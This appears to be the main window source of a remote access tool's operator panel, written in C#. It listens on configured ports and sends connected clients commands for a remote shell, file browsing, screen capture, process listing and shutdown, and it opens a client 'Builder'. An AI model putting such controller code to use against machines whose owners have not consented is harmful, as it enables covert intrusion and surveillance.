using PacketLib;
using Server.Forms.UtilsForm;
using Server.Network;
using Server.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent(); 
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Port_InputBox inputBox = new Port_InputBox();
            if (inputBox.ShowDialog() == DialogResult.OK)
            {
                bool contains = false;
                string port = inputBox.numericUpDown1.Value.ToString();
                foreach (var _port in
                    Settings.Default.Ports
                    .Split(new[] { ", " }, StringSplitOptions.None))
                {
                    if (_port == port)
                    {
                        contains = true;
                        break;
                    }
                }
                if (!contains)
                {
                    ListViewItem item = new ListViewItem();
                    item.Text = port;
                    item.SubItems.Add("false");
                    _Listener _Listener = new _Listener(Convert.ToInt32(port));
                    item.Tag = _Listener;
                    portView.Items.Add(item);

                    Settings.Default.Ports += port + ", ";
                    Settings.Default.Save();
                }
            }
        }

        private async void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            List<string> ports = Settings.Default.Ports
                    .Split(new[] { ", " }, StringSplitOptions.None).ToList();

            /*await Task.Run(() =>
            {*/
                foreach (ListViewItem selectedItem in portView.SelectedItems)
                {
                    if (ports.Contains(selectedItem.Text))
                    {
                        ports.Remove(selectedItem.Text);

                        _Listener _Listener = (_Listener)selectedItem.Tag;
                        _Listener.Stop();

                        portView.Items.Remove(selectedItem);
                    }
                }
         /*   });*/
            foreach (string port in ports)
            {
                sb.Append(port + ", ");
            }
            Settings.Default.Ports = sb.ToString();
            Settings.Default.Save();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            Ports();
            if (Settings.Default.AutoListen)
            {
                autoListenCb.Checked = Settings.Default.AutoListen;
                foreach (ListViewItem listViewItem in portView.Items)
                {
                    if (!Convert.ToBoolean(listViewItem.SubItems[1].Text))
                    {
                        _Listener _Listener = (_Listener)listViewItem.Tag;
                        _Listener.Start();
                        listViewItem.SubItems[1].Text = "true";
                    }
                }
            }
        }

        public void Ports()
        {
            string[] ports = Settings.Default.Ports
                .Split(new[] { ", " }, StringSplitOptions.None);
            foreach (string port in ports)
            {
                if (string.IsNullOrEmpty(port)) continue;
                _Listener _Listener = new _Listener(Convert.ToInt32(port));
                ListViewItem item = new ListViewItem();
                item.Text = port;
                item.SubItems.Add("false");
                item.Tag = _Listener;
                portView.Items.Add(item);
            }
        }

        private async void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
           /* await Task.Run(() =>
            {*/
                foreach (ListViewItem listViewItem in portView.SelectedItems)
                {
                    if (!Convert.ToBoolean(listViewItem.SubItems[1].Text))
                    {
                        _Listener _Listener = (_Listener)listViewItem.Tag;
                        _Listener.Start();
                        listViewItem.SubItems[1].Text = "true";
                    }
                }
       /*     });*/
        }

        private async void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
          /*  await Task.Run(() =>
            {*/
                foreach (ListViewItem listViewItem in portView.SelectedItems)
                {
                    if (Convert.ToBoolean(listViewItem.SubItems[1].Text))
                    {
                        _Listener _Listener = (_Listener)listViewItem.Tag;
                        _Listener.Stop();
                        listViewItem.SubItems[1].Text = "false";
                    }
                }

            /*});*/
        }

        private void infoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.Set("Packet", "Info");

            foreach (_Client client in GetSelectedClients())
            {
                InfoForm infoForm = (InfoForm)Application.OpenForms["Info:" + client.uid];
                if (infoForm == null)
                {
                    infoForm = new InfoForm
                    {
                        Name = "Info:" + client.uid,
                        Text = "Info:" + client.uid,
                        _Client = client,
                    };
                    infoForm.Show();
                    client.Send(msgPack.Pack());
                }
            }
        }

        private List<_Client> GetSelectedClients()
        {
            List<_Client> list = new List<_Client>();
            foreach(ListViewItem listViewItem in clientView.SelectedItems)
            {
                list.Add((_Client)listViewItem.Tag);
            }
            return list;
        }

        private void autoListenCb_Click(object sender, EventArgs e)
        {
            Settings.Default.AutoListen = autoListenCb.Checked;
            Settings.Default.Save();
        }

        private void shellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.Set("Packet", "StartShell");

            foreach (_Client client in GetSelectedClients())
            {
                ShellForm shellForm = (ShellForm)Application.OpenForms["Shell:" + client.uid];
                if (shellForm == null)
                {
                    shellForm = new ShellForm
                    {
                        Name = "Shell:" + client.uid,
                        Text = "Shell:" + client.uid,
                        _Client = client,
                    };
                    shellForm.Show();
                    client.Send(msgPack.Pack());
                }
            }
        }

        private void filemanagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.Set("Packet", "FileManager");
            msgPack.Set("Command", "Drives");

            foreach (_Client client in GetSelectedClients())
            {
                FileManagerForm filemanagerForm = (FileManagerForm)Application.OpenForms["FileManager:" + client.uid];
                if (filemanagerForm == null)
                {
                    filemanagerForm = new FileManagerForm
                    {
                        Name = "FileManager:" + client.uid,
                        Text = "FileManager:" + client.uid,
                        _Client = client,
                    };
                    filemanagerForm.Show();
                    client.Send(msgPack.Pack());
                }
            }
        }

        private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.Set("Packet", "Desktop");
            msgPack.Set("Command", "Screens");

            foreach (_Client client in GetSelectedClients())
            {
                DesktopForm desktopForm = (DesktopForm)Application.OpenForms["Desktop:" + client.uid];
                if (desktopForm == null)
                {
                    desktopForm = new DesktopForm
                    {
                        Name = "Desktop:" + client.uid,
                        Text = "Desktop:" + client.uid,
                        _Client = client,
                    };
                    desktopForm.Show();
                    client.Send(msgPack.Pack());
                }
            }
        }

        private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.Set("Packet", "ProcessManager");
            msgPack.Set("Command", "List");

            foreach (_Client client in GetSelectedClients())
            {
                ProcessManagerForm processManagerForm = (ProcessManagerForm)Application.OpenForms["ProcessManager:" + client.uid];
                if (processManagerForm == null)
                {
                    processManagerForm = new ProcessManagerForm
                    {
                        Name = "ProcessManager:" + client.uid,
                        Text = "ProcessManager:" + client.uid,
                        _Client = client,
                    };
                    processManagerForm.Show();
                    client.Send(msgPack.Pack());
                }
            }
        }

        private void logOffToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pc("LogOff");
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pc("Shutdown");
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pc("Restart");
        }


        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pc("Kill");
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pc("Reconnect");
        }

        public void Pc(string _do)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.Set("Packet", _do);
            foreach (_Client client in GetSelectedClients())
            {
                client.Send(msgPack.Pack());
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Builder_Form builder_Form = new Builder_Form();
            builder_Form.ShowDialog();
        }
    }
}
